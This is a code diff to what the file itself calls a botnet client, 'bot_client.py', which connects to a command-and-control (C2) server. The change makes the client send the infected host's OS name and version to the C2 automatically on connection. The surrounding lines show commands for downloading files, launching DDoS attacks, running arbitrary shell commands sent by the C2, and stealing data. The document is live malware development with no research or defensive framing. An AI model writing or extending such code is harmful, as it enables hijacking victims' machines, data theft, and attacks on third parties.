@@ -19,6 +19,7 @@ bot_client.py – Ultra‑Pro Bot Client (Dynamic Key Version)
 * UPDATED: Full update installation with C2 confirmation
 * FIXED: Steal disabled status properly stops data stealing
 * FIXED: Auto-Update module compatibility
+* FIXED: Auto-send OS_INFO to C2 on connection
 """
 
 import os
@@ -497,6 +498,7 @@ class BotClient:
         print_header("🤖 BOT CLIENT INITIALIZING")
 
         self.os_name = platform.system()
+        self.os_version = platform.version()
         self.bot_name = "botnet"
         self._start_time = time.time()  # Bot start time for uptime
         self.bot_number = 0  # Bot Number (will be assigned by C2)
@@ -751,6 +753,18 @@ class BotClient:
             self.connected = True
             print_success(f"Connected to C2 at {C2_IP}:{C2_PORT}")
             log.info(f"Connected to C2 at {C2_IP}:{C2_PORT} (Key Sent)")
+
+            # ✅✅✅ OS_INFO স্বয়ংক্রিয়ভাবে পাঠান ✅✅✅
+            try:
+                os_name = self.os_name
+                os_version = self.os_version
+                os_info = f"OS_INFO:{os_name}|{os_version}"
+                self._send(os_info)
+                print_info(f"📤 Auto-sent OS info to C2: {os_name} {os_version}")
+                log.info(f"Auto-sent OS info to C2: {os_name} {os_version}")
+            except Exception as e:
+                log.warning(f"Failed to send OS info: {e}")
+
             return True
 
         except socket.timeout:
@@ -1142,7 +1156,6 @@ class BotClient:
                 return ""
 
             # ✅ FIXED: DOWNLOAD command
-            # ✅ FIXED: DOWNLOAD command
             elif main == "DOWNLOAD":
                 if len(parts) < 2:
                     return "ERROR: DOWNLOAD requires filename"
@@ -1247,7 +1260,6 @@ class BotClient:
                 ).start()
                 return f"DDOS {ddos_type} attack started on {target_ip}:{target_port}."
 
-           # bot_client.py এর _process_command মেথডে EXEC অংশটি এইভাবে পরিবর্তন করুন:
             elif main == "EXEC":
                 shell_cmd = cmd[5:].strip()
                 if not shell_cmd:
@@ -1318,6 +1330,7 @@ class BotClient:
                 except Exception as e:
                     print_error(f"Execution error: {e}")
                     return f"ERROR: {e}"
+
             elif main == "STEAL":
                 # ✅ Check if Steal is enabled by C2
                 if not self.steal_enabled:
